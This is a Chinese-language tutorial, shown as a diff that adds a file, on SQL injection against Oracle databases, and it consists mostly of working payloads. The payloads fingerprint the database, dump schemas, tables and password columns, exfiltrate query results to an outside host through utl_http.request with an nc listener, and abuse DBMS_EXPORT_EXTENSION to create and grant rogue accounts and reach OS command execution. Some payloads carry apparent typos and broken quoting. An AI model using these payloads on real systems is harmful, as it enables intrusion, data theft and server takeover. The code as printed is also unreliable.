@@ -1,0 +1,86 @@
+Oracle 注入基础及相关特性总结发布:Mr.DzY | 发布时间: 2011年9月13日
+By LengF 2011-09-11
+1.判断是否存在注入点的方法和其他 数据库 类似，and 1=1 和and 1=2
+2.判断数据库为oracle
+提交注释字符/*，返回正常即是MySQL，否则继续提交注释符号--，该符号是 Oracle 和MsSQL支持的注释符，返回正常就需要继续判断。可以继续提交多语句支持符号;如果支持多行查询，说明是MSSQL，因为Oracle不支持多行查询，可以继续提交查询语句：
+and exist(select * from dual)
+或
+and (select count(*) from user_tables)>0--
+利用的原理是dual表和user_tables表是oracle中的系统表，返回正常就判断为Oracle
+3.获取基本信息
+(1)获取字段数，同样可以使用oder by N 根据返回页面判断
+(2)获取数据库版本，执行下面语句：
+and 1=2 union select 1,2,(select banner from sys.v_$version where rownum=1),4,5,6 from dual
+(3)获取数据库连接用户名
+and 1=2 union select 1,2,(select SYS_CONTEXT('USERENV','CURRENT_USER') from dual),4,5,6 from dual
+(4)获取日志文件的绝对路径，同样可以通过这个绝对判断系统类型
+and 1=2 union select 1,2,(select instance_name from v$instance),4,5,6 from dual
+4.和Mysql>=5.0和MsSQL>=2005的特性利用
+(1)爆数据库名
+# 爆出第一个数据库名
+and 1=2 union select 1,2,(select owner from all_tables where rownum=1),4,5,6 from dual
+# 依次爆出所有数据库名,假设第一个库名为first_dbname
+and 1=2 union select 1,2,(select owner from all_tables where rownum=1 and owner<>'first_dbname'),4,5,6 from dual
+(2)爆出表名
+# 爆出第一个表名
+and 1=2 union select 1,2,(select table_name from user_tables where rownum=1),4,5,6 from dual
+同理,同爆出下一个数据库类似爆出下一个表名就不说了,但是必须注意表名用大写或者表名大写的十六进制代码。
+有时候我们只想要某个数据库中含密码字段的表名,采用模糊查询语句，如下：
+and (select column_name from user_tab_columns where column_name like '%25pass%25')>0
+如果成功也可以继续提交
+and 1=2 union select 1,2,(select column_name from user_tab_columns where column_name like '%25pass%25'),4,5,6 from dual
+这也是猜解表名的一种方法，不过比上面方法麻烦。
+(3)爆字段名
+# 爆出表tablename中的第一个字段名
+and 1=2 union select 1,2,(select column_name from user_tab_columns where table_name='tablename' and rownum=1),4,5,6 from dual
+# 爆出第一个字段名
+and 1=2 union select 1,2,(select column_name from user_tab_columns where table_name='tablename' and column_name<>'first_col_name' and rownum=1),4,5,6 from dual
+这样就可以爆出所有的字段名了。
+这样就可以和普通的注入一样获取字段内容了,就不多说了。
+5.Oracle注入过程的特性
+这点主要说明在Oracle注入中和其他数据库注入不大一样的几点说明。
+(1)字段类型必须确定
+oracle注入中严格要求各个字段的类型必须和定义的一致否则会出错，我们可以通过下面方法确定各个字段的类型。
+and 1=2 union select 'null',null,null,null,null,null from dual
+如此依次将下面的每个null用单引号替换，查看返回页面，返回正常说明那个字段为字符型。确定所有字段类型后就可以注入了， 是字符型的就用‘null’，数字型的就直接null
+(2)UTL_HTTP存储过程反弹注入
+oracle中提供utl_http.request的包函数,用于取得远程web服务器的请求信息，因为我们可以利用它来反弹回信息。再加上oracle本身经常是已system运行的，所以拿下了oracle基本拿下了服务器了。
+具体使用方法如下：
+# 判断UTL_HTTP存储搓成是否可用
+and exist(select count(*) from all_objects where object_name='UTL_HTTP')
+# 第一步，本地用nc监听一个端口
+nc -vv -l -p 8989
+# 注入点执行
+and utl_http.request('http:// www.2cto.com:port'||(SQL Query))=1
+# 举个例子
+and utl_http.request('http:// www.2cto.com:port'||(select banner from sys.v_$version where rownum=1))=1--
+在NC端就会接收到SQL执行返回的结果。这个有点麻烦，因为每次注入点提交一次请求有nc会断开连接，需要重新启动。
+(3)系统特性
+在不同的OS平台我们需要考虑到，在window下，oracle是已服务方式启动，在web注射下就可以直接获得system权限， Linux 下虽然不是root不过权限也挺高的，可能可以通过web注射添加系统帐户。他们同样用到的函数是：
+SYS.DBMS_EXPORT_EXTENSION.GET.DOMAIN_INDEX_TABLES()
+具体的应用方法是
+SYS.DBMS_EXPORT_EXTENSION.GET.DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);[Attack-Command]END;--',SYS',0,'1',0)
+将其中的Attack-Command替换成对应的命令即可，但是需要说明的是该利用方法必须结合上面的UTL_HTTP存储过程。
+(4)注入点创建runCMD和文件操作
+这个没有实践过不敢妄言，等有了实践再行补上
+(5)创建远程连接帐号
+注入点执行：
+and '1'<>'2'||(select SYS.DBMS_EXPORT_EXTENSION.GET.DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '' DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '' '' Create USER LengF IDENTIFIED BY LengF '' '';END;--',SYS',0,'1',0) from dual)
+确定帐号是否添加成功：
+and 1<>(select user_id from all_users where username='lengf')
+赋予帐户远程连接权限：
+and '1'<>'2'||(select SYS.DBMS_EXPORT_EXTENSION.GET.DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '' DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '' '' GRANT CONNECT to LengF '' '';END;--',SYS',0,'1',0) from dual
+删除帐号：
+and '1'<>'2'||(select SYS.DBMS_EXPORT_EXTENSION.GET.DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '' DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '' '' drop USER LengF '' '';END;--',SYS',0,'1',0) from dual
+(6)命令执行
+通过添加帐号或者其他手段获取远程连接权限后，利用SQLPUS连接后即可执行命令。
+在window中使用：
+host CMD # CMDw为具体命令，比如ipconfig
+在Linux下可以使用:
+!command CMD
+当然除了这个方法执行命令外还可以通过导入导出表执行命令，比较麻烦感兴趣可以自己查。
+Oracle注入危害还是很大的，甚至可以执行exploit代码，基本的应用和特性就这些了。
+
+
+
+
